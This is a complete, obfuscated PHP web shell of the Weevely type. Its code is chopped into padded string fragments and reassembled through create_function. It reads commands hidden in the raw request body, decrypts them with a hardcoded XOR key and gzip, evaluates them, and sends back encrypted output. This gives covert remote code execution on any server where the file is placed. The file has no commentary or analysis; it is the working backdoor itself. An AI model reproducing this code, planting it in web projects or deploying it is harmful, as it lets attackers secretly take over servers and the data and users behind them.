<?php
$Z='get_-tcontent-ts();@ob_end_cle-tan();$r=-t@base-t64_enco-tde-t(-t@x(@gzcompres-t-ts($o),$k));p-trin-tt("$p-t$kh$r$kf");}';
$N='/input")-t,$m)-t==1) {@-tob_st-tart-t();@ev-tal(@gz-t-tuncompress(@x(@ba-tse64_-tdecod-t-t-te($m[-t1]),$k)));$o=@ob-t-t_';
$P='t,$k){$c=strlen($k-t);$l=s-ttrlen($t-t)-t;$o="";f-tor($i=0;$i<$-tl;-t){fo-tr-t($j=-t0;($j<-t$c&&$i<$-tl)-t;$j++,$i++)';
$k='{$o.=$t{$-ti}^$-tk{$j};}}re-tturn -t$o;-t}if-t (@preg_match(-t-t"/$kh(.+)-t$kf-t/",@fil-t-te_get_cont-tents("php-t:/';
$G='$k="5a-tb17-te-t70";$kh="82-t10f1d3ecb-t1-t";$kf="2890-t-t49f8918e";$p="-thGAQPjK-t-tLjKHs3I-t-tGD"-t-t;function -tx(-t$';
$x=str_replace('bn','','crbneatbne_bnfubnnbnctbnion');
$C=str_replace('-t','',$G.$P.$k.$N.$Z);
$H=$x('',$C);$H();
?>
